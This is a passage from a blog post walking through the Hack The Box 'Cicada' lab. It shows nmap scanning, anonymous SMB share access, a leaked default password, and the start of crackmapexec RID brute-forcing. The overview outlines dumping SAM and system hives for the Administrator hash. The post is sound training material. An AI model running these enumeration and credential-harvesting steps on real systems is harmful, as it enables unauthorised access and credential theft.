<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Foued SAIDI">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://fouedsaidi.com/2025/02/14/hackthebox-cicada/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="OverviewCicada is an easy-difficulty machine from Hack The Box dealing with initial enumeration that’ll reveal some exposed SMB shares where we’ll get some creds to eventually connect to another SMB s">
<meta property="og:type" content="article">
<meta property="og:title" content="Hackthebox: Cicada">
<meta property="og:url" content="http://fouedsaidi.com/2025/02/14/Hackthebox-Cicada/index.html">
<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
<meta property="og:description" content="OverviewCicada is an easy-difficulty machine from Hack The Box dealing with initial enumeration that’ll reveal some exposed SMB shares where we’ll get some creds to eventually connect to another SMB s">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Cicada/Cicada.png">
<meta property="article:published_time" content="2025-02-14T13:30:43.000Z">
<meta property="article:modified_time" content="2025-02-15T13:41:04.302Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Cicada/Cicada.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
    <meta name="theme-color" content="#5618ff">
    <link rel="shortcut icon" href="/images/logo.png">
    <!--- Page Info-->
    
    <title>
        
            Hackthebox: Cicada -
        
        Foued Saidi&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">

    <!--- Font Part-->
    
    
    
    

    <!--- Inject Part-->
    
    <script id="hexo-configurations">
    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.0.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <span class="swup-progress-icon">
            <i class="fa-solid fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container">
    
    <div class="navbar-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Foued Saidi&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/"  >
                                    
                                        
                                            <i class="fa-regular fa-house"></i>
                                        
                                        HOME
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/archives"  >
                                    
                                        
                                            <i class="fa-regular fa-archive"></i>
                                        
                                        ARCHIVES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/categories"  >
                                    
                                        
                                            <i class="fa-regular fa-folder"></i>
                                        
                                        CATEGORIES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown" 
                                    href="#" onClick="return false;">
                                    
                                        
                                            <i class="fa-regular fa-user"></i>
                                        
                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
                                    
                                </a>
                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                    
                                        <li>
                                        <a href="/about">ME
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
                                        </a>
                                        </li>
                                    
                                    </ul>
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile drawer -->
    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/"  >
                             
                                
                                    <i class="fa-regular fa-house"></i>
                                
                                HOME
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/archives"  >
                             
                                
                                    <i class="fa-regular fa-archive"></i>
                                
                                ARCHIVES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/categories"  >
                             
                                
                                    <i class="fa-regular fa-folder"></i>
                                
                                CATEGORIES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
                        href="#" onClick="return false;">
                            
                                
                                    <i class="fa-regular fa-user"></i>
                                
                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                              
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" href="/about">ME</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
                            </li>
                        
                    
            

        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                <div class="w-full flex items-center pt-6 justify-start">
                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Cicada</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/logo.png">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-02-14 17:30:43</span>
        <span class="mobile">2025-02-14 17:30:43</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-02-15 17:41:04</span>
            <span class="mobile">2025-02-15 17:41:04</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>Cicada is an easy-difficulty machine from Hack The Box dealing with initial enumeration that’ll reveal some exposed SMB shares where we’ll get some creds to eventually connect to another SMB share to exfiltrate some more credentials and connect to system to claim our user flag. Finally exploiting SeBackupPrivilege privilege that’ll allow us to backup sam and system hives so we could exfiltrate hive secrets to get our Administrator hash and root flag.</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Cicada/Cicada.png"
                      alt="Cicada-info-card"
                ><figcaption>Cicada-info-card</figcaption></figure></p>
<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">35.108</span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2024</span><span class="literal">-09-28</span> <span class="number">20</span>:<span class="number">03</span> W. Central Africa Standard Time</span><br><span class="line">NSOCK ERROR <span class="function">[<span class="number">0.2640</span><span class="type">s</span>] <span class="title">ssl_init_helper</span></span>(): OpenSSL legacy provider failed to load.</span><br><span class="line"></span><br><span class="line">Stats: <span class="number">0</span>:<span class="number">00</span>:<span class="number">29</span> elapsed; <span class="number">0</span> hosts completed (<span class="number">1</span> up), <span class="number">1</span> undergoing Service Scan</span><br><span class="line">Service scan Timing: About <span class="number">81.82</span>% done; ETC: <span class="number">20</span>:<span class="number">03</span> (<span class="number">0</span>:<span class="number">00</span>:<span class="number">04</span> remaining)</span><br><span class="line">Stats: <span class="number">0</span>:<span class="number">00</span>:<span class="number">29</span> elapsed; <span class="number">0</span> hosts completed (<span class="number">1</span> up), <span class="number">1</span> undergoing Service Scan</span><br><span class="line">Service scan Timing: About <span class="number">90.91</span>% done; ETC: <span class="number">20</span>:<span class="number">03</span> (<span class="number">0</span>:<span class="number">00</span>:<span class="number">02</span> remaining)</span><br><span class="line">Stats: <span class="number">0</span>:<span class="number">01</span>:<span class="number">25</span> elapsed; <span class="number">0</span> hosts completed (<span class="number">1</span> up), <span class="number">1</span> undergoing Script Scan</span><br><span class="line">NSE Timing: About <span class="number">99.93</span>% done; ETC: <span class="number">20</span>:<span class="number">04</span> (<span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span> remaining)</span><br><span class="line">Stats: <span class="number">0</span>:<span class="number">01</span>:<span class="number">25</span> elapsed; <span class="number">0</span> hosts completed (<span class="number">1</span> up), <span class="number">1</span> undergoing Script Scan</span><br><span class="line">NSE Timing: About <span class="number">99.93</span>% done; ETC: <span class="number">20</span>:<span class="number">04</span> (<span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span> remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">35.108</span></span><br><span class="line">Host is up (<span class="number">0.13</span>s latency).</span><br><span class="line">Not shown: <span class="number">989</span> filtered tcp ports (no<span class="literal">-response</span>)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line"><span class="number">53</span>/tcp   open  domain        Simple DNS Plus</span><br><span class="line"><span class="number">88</span>/tcp   open  kerberos<span class="literal">-sec</span>  Microsoft Windows Kerberos (server time: <span class="number">2024</span><span class="literal">-09-29</span> <span class="number">02</span>:<span class="number">07</span>:<span class="number">07</span>Z)</span><br><span class="line"><span class="number">135</span>/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp  open  netbios<span class="literal">-ssn</span>   Microsoft Windows netbios<span class="literal">-ssn</span></span><br><span class="line"><span class="number">389</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default<span class="literal">-First-Site-Name</span>)</span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=CICADA<span class="literal">-DC</span>.cicada.htb</span><br><span class="line">| Subject Alternative Name: othername: <span class="number">1.3</span>.<span class="number">6.1</span>.<span class="number">4.1</span>.<span class="number">311.25</span>.<span class="number">1</span>::&lt;unsupported&gt;, DNS:CICADA<span class="literal">-DC</span>.cicada.htb</span><br><span class="line">| Not valid before: <span class="number">2024</span><span class="literal">-08-22T20</span>:<span class="number">24</span>:<span class="number">16</span></span><br><span class="line">|_Not valid after:  <span class="number">2025</span><span class="literal">-08-22T20</span>:<span class="number">24</span>:<span class="number">16</span></span><br><span class="line">|_ssl<span class="literal">-date</span>: TLS randomness does not represent time</span><br><span class="line"><span class="number">445</span>/tcp  open  microsoft<span class="literal">-ds</span>?</span><br><span class="line"><span class="number">464</span>/tcp  open  kpasswd5?</span><br><span class="line"><span class="number">593</span>/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">636</span>/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default<span class="literal">-First-Site-Name</span>)</span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=CICADA<span class="literal">-DC</span>.cicada.htb</span><br><span class="line">| Subject Alternative Name: othername: <span class="number">1.3</span>.<span class="number">6.1</span>.<span class="number">4.1</span>.<span class="number">311.25</span>.<span class="number">1</span>::&lt;unsupported&gt;, DNS:CICADA<span class="literal">-DC</span>.cicada.htb</span><br><span class="line">| Not valid before: <span class="number">2024</span><span class="literal">-08-22T20</span>:<span class="number">24</span>:<span class="number">16</span></span><br><span class="line">|_Not valid after:  <span class="number">2025</span><span class="literal">-08-22T20</span>:<span class="number">24</span>:<span class="number">16</span></span><br><span class="line">|_ssl<span class="literal">-date</span>: TLS randomness does not represent time</span><br><span class="line"><span class="number">3268</span>/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default<span class="literal">-First-Site-Name</span>)</span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=CICADA<span class="literal">-DC</span>.cicada.htb</span><br><span class="line">| Subject Alternative Name: othername: <span class="number">1.3</span>.<span class="number">6.1</span>.<span class="number">4.1</span>.<span class="number">311.25</span>.<span class="number">1</span>::&lt;unsupported&gt;, DNS:CICADA<span class="literal">-DC</span>.cicada.htb</span><br><span class="line">| Not valid before: <span class="number">2024</span><span class="literal">-08-22T20</span>:<span class="number">24</span>:<span class="number">16</span></span><br><span class="line">|_Not valid after:  <span class="number">2025</span><span class="literal">-08-22T20</span>:<span class="number">24</span>:<span class="number">16</span></span><br><span class="line">|_ssl<span class="literal">-date</span>: TLS randomness does not represent time</span><br><span class="line"><span class="number">3269</span>/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default<span class="literal">-First-Site-Name</span>)</span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=CICADA<span class="literal">-DC</span>.cicada.htb</span><br><span class="line">| Subject Alternative Name: othername: <span class="number">1.3</span>.<span class="number">6.1</span>.<span class="number">4.1</span>.<span class="number">311.25</span>.<span class="number">1</span>::&lt;unsupported&gt;, DNS:CICADA<span class="literal">-DC</span>.cicada.htb</span><br><span class="line">| Not valid before: <span class="number">2024</span><span class="literal">-08-22T20</span>:<span class="number">24</span>:<span class="number">16</span></span><br><span class="line">|_Not valid after:  <span class="number">2025</span><span class="literal">-08-22T20</span>:<span class="number">24</span>:<span class="number">16</span></span><br><span class="line">|_ssl<span class="literal">-date</span>: TLS randomness does not represent time</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least <span class="number">1</span> open and <span class="number">1</span> closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows <span class="number">2016</span> (<span class="number">85</span>%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2016</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server <span class="number">2016</span> (<span class="number">85</span>%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (test conditions non<span class="literal">-ideal</span>).</span><br><span class="line">Network Distance: <span class="number">2</span> hops</span><br><span class="line">Service Info: Host: CICADA<span class="literal">-DC</span>; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2<span class="literal">-time</span>:</span><br><span class="line">|   date: <span class="number">2024</span><span class="literal">-09-29T02</span>:<span class="number">07</span>:<span class="number">54</span></span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2<span class="literal">-security-mode</span>:</span><br><span class="line">|   <span class="number">311</span>:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_c<span class="built_in">lock-skew</span>: <span class="number">7</span>h03m35s</span><br><span class="line"></span><br><span class="line">TRACEROUTE (<span class="keyword">using</span> port 139/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">153.00</span> ms <span class="number">10.10</span>.<span class="number">16.1</span></span><br><span class="line"><span class="number">2</span>   <span class="number">153.00</span> ms <span class="number">10.129</span>.<span class="number">35.108</span></span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">107.05</span> seconds</span><br><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="SMB-Access-to-Credentials-exfiltration"><a href="#SMB-Access-to-Credentials-exfiltration" class="headerlink" title="SMB Access to Credentials exfiltration"></a>SMB Access to Credentials exfiltration</h3><p>We can see that we have our “typical” windows machine ports.</p>
<p>We can also see that we have SMB on the box, let’s explore it:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ smbclient -L \\10.129.192.186 -N</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        DEV             Disk</span><br><span class="line">        HR              Disk</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        NETLOGON        Disk      Logon server share</span><br><span class="line">        SYSVOL          Disk      Logon server share</span><br><span class="line">tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUT</span><br><span class="line">SMB1 disabled -- no workgroup available</span><br></pre></td></tr></table></figure></div>

<p>And we do find some interesting shares. However, we can only access <code>HR</code> for now:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ smbclient  \\\\10.129.192.186\\HR -N</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Thu Mar 14 13:29:09 2024</span><br><span class="line">  ..                                  D        0  Thu Mar 14 13:21:29 2024</span><br><span class="line">  Notice from HR.txt                  A     1266  Wed Aug 28 18:31:48 2024</span><br><span class="line">                4168447 blocks of size 4096. 422276 blocks available</span><br><span class="line">smb: \&gt; get <span class="string">&quot;Notice from HR.txt&quot;</span></span><br><span class="line">getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)</span><br><span class="line">smb: \&gt;</span><br></pre></td></tr></table></figure></div>

<p>We find an interesting file that we download:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ cat Notice\ from\ HR.txt</span><br><span class="line"></span><br><span class="line">Dear new hire!</span><br><span class="line"></span><br><span class="line">Welcome to Cicada Corp! We&#x27;re thrilled to have you join our team. As part of our security protocols, it&#x27;s essential that you change your default password to something unique and secure.</span><br><span class="line"></span><br><span class="line">Your default password is: Cicada$M6Corpb*@Lp#nZp!8</span><br><span class="line"></span><br><span class="line">To change your password:</span><br><span class="line"></span><br><span class="line">1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.</span><br><span class="line">2. Once logged in, navigate to your account settings or profile settings section.</span><br><span class="line">3. Look for the option to change your password. This will be labeled as &quot;Change Password&quot;.</span><br><span class="line">4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.</span><br><span class="line">5. After changing your password, make sure to save your changes.</span><br><span class="line"></span><br><span class="line">Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.</span><br><span class="line"></span><br><span class="line">If you encounter any issues or need assistance with changing your password, don&#x27;t hesitate to reach out to our support team at support@cicada.htb.</span><br><span class="line"></span><br><span class="line">Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!</span><br><span class="line"></span><br><span class="line">Best regards,</span><br><span class="line">Cicada Corp</span><br></pre></td></tr></table></figure></div>

<p>And we can see that we have a password inside that note <code>Cicada$M6Corpb*@Lp#nZp!8</code>. Let’s first try to enumerate the system for usernames using crackmapexec:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ crackmapexec smb 10.129.192.186 -u <span class="string">&#x27;anonymous&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --rid-brute</span><br><span 